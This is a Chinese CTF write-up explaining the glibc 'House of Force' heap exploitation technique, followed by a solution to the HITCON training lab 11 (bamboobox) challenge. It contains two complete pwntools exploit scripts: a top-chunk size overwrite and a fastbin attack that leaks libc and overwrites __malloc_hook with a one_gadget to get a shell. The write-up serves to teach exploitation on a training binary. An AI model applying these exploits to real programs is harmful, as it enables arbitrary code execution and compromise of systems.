# House Of Force

## topchunk 分配机制

> 作为前置知识，回顾一下

当进行堆分配时，如果当前所有空闲（bin中）的堆块都无法满足条件，且 topchunk 大小可以满足需要空间的话，那么就会从 topchunk 中分割对应的大小用作堆块空间。

topchunk 大小是否满足的计算源码：

```c
// 获取当前的top chunk，并计算其对应的大小
victim = av->top;
size   = chunksize(victim);
// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。
if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE)) 
{
    remainder_size = size - nb;
    remainder      = chunk_at_offset(victim, nb);
    av->top        = remainder;
    set_head(victim, nb | PREV_INUSE |
            (av != &main_arena ? NON_MAIN_ARENA : 0));
    set_head(remainder, remainder_size | PREV_INUSE);

    check_malloced_chunk(av, victim, nb);
    void *p = chunk2mem(victim);
    alloc_perturb(p, bytes);
    return p;
}
```

简化一下就是满足 ``MINSIZE+申请大小<=topchunk size`` 即可通过检查，从 topchunk 上分配空间用作新堆块。

topchunk 也会向高地址移动，假设从 topchunk 分配 0x60 或 0x68 空间：

| 原topchunk | 现topchunk | malloc(n) | topchunk移动 |
| ---------- | ---------- | --------- | ------------ |
| 0x603020   | 0x603090   | 0x60      | 0x70         |
| 0x603020   | 0x603090   | 0x68      | 0x70         |

## 原理

house of force 产生原因自安于 glibc 对于 topchunk 的处理。按照上文所说的，当满足 ``MINSIZE+申请大小<=topchunk size`` 即可通过检查，可以将 topchunk 空间划分给堆块，并且 topchunk 移动相应距离。

那么就可以通过申请特定大小 chunk ，将 topchunk 移动到目标地址，再次申请堆就会分配到目标地址，实现任意地址读写操作。实现的关键就是绕过 topchunk size 检查，绕过方法就是将 size 覆盖为 -1（0xffffffffffffffff），让 size 变成最大（malloc 会强制转换为 unsigned int），一般情况都能满足 size check 要求。

topchunk 可以有两个移动方向：

1. malloc(负数)，将 topchunk 往低地址移
2. malloc(正数)，将 topchunk 往高地址移

## 使用条件

1. 能够以溢出等方式控制到 top chunk 的 size 域
2. 能够自由地控制堆分配尺寸的大小

实现效果：任意地址读写

## 计算偏移

现在地址：topchunk 现在指向的地址

目标地址：往哪里写入的地址

* 往低地址移（负数）：``偏移=现在地址-目标地址-0x20``
* 往高地址移（正数）：``偏移=目标地址-现在地址``

## 例题

### HITCON training lab 11

#### 基本情况

用 chunk_ptr 和 chunk_size  两个列表维护，基于下标操作堆块。增删查改功能都有。

#### 漏洞

修改函数要求输入修改长度，对该长度没有限制，造成堆溢出：

```c
printf("Please enter the length of item name:", &buf);
read(0, &v4, 8uLL);
length = atoi(&v4);
printf("Please enter the new name of the item:", &v4);
//直接写入，没有对size进行检查
*(_BYTE *)(chunk_ptr_list[2 * v2] + (signed int)read(0, (void *)chunk_ptr_list[2 * v2], length)) = 0;
```

#### 思路

> fastbin 攻击 malloc_hook 方法和正常套路流程差不多，最后贴 exp 。

house of force 使用条件都满足，先明确将 topchunk 向上调多少。申请好等等用来溢出修改 topchunk size 的 chunk 之后，gdb 调试。

![image-20201103111102583](https://gitee.com/mrskye/Picbed/raw/master/img/20201103111102.png)

这里就直接将堆申请覆盖整个第一个堆块，距离计算：

```python
#(0x603010-0x603090)-0x20=-0xa0
add(-0xa0,'b')
add(0x10,'skye'*2+p64(elf.sym['magic']))
```

![image-20201103112332803](https://gitee.com/mrskye/Picbed/raw/master/img/20201103112332.png)

后面就申请一个堆，写入内容，也就是任意地址写。

#### EXP

house of force

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

p = process("./bamboobox")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./bamboobox")
# p = remote("node3.buuoj.cn",29945)
# libc = ELF("./libc-2.23.so")

def add(size,content):
	p.recvuntil(':')
	p.sendline('2')
	p.recvuntil(':')
	p.sendline(str(size))
	p.recvuntil(':')
	p.send(content)

def show():
	p.recvuntil(':')
	p.sendline('1')

def edit(id,size,content):
	p.recvuntil(':')
	p.sendline('3')
	p.recvuntil(':')
	p.sendline(str(id))
	p.recvuntil(':')
	p.sendline(str(size))
	p.recvuntil(':')
	p.send(content)

def remove(id):
	p.recvuntil(':')
	p.sendline('4')
	p.recvuntil(':')
	p.sendline(str(id))

add(0x68,'a')
payload = 'a'*0x68+p64(0xffffffffffffffff)
edit(0,len(payload),payload)
add(-0xa0,'b')
add(0x10,'skye'*2+p64(elf.sym['magic']))


p.recvuntil(':')
p.sendline('5')

# gdb.attach(p)
p.interactive()
```

fastbin attack

```python
from pwn import *
context(log_level='debug',os='linux',arch='amd64')

# p = process("./bamboobox")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF("./bamboobox")
p = remote("node3.buuoj.cn",29945)
libc = ELF("./libc-2.23.so")

def add(size,content):
	p.recvuntil(':')
	p.sendline('2')
	p.recvuntil(':')
	p.sendline(str(size))
	p.recvuntil(':')
	p.send(content)

def show():
	p.recvuntil(':')
	p.sendline('1')

def edit(id,size,content):
	p.recvuntil(':')
	p.sendline('3')
	p.recvuntil(':')
	p.sendline(str(id))
	p.recvuntil(':')
	p.sendline(str(size))
	p.recvuntil(':')
	p.send(content)

def remove(id):
	p.recvuntil(':')
	p.sendline('4')
	p.recvuntil(':')
	p.sendline(str(id))

add(0x100,'top')
add(0x68,'overloping')#1
add(0x400-0x10,'end')
add(0x68,'/bin/sh\x00protect')#3

remove(0)

payload = 'a'*0x60+p64(0X180)#+'\x00'
edit(1,len(payload),payload)

remove(2)

add(0x100,'top')

show()
p.recvuntil("1 : ")
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
libc_base = leak_addr-0x3c4b78
log.info("libc_base:"+hex(libc_base))
malloc_hook = libc_base+libc.sym['__malloc_hook']
log.info("malloc_hook:"+hex(malloc_hook))
realloc = libc_base+libc.sym['realloc']


add(0x68,'skye')#2
remove(2)
edit(1,len(p64(malloc_hook-27-8)),p64(malloc_hook-27-8))
add(0x68,'skye')

'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
onegadget = libc_base + 0x4526a#0x4527a
add(0x68,'a'*11+p64(onegadget)+p64(realloc))
# gdb.attach(p)
p.recvuntil(':')
p.sendline('2')
p.recvuntil('name:')
p.sendline(str(0x68))


p.interactive()
```

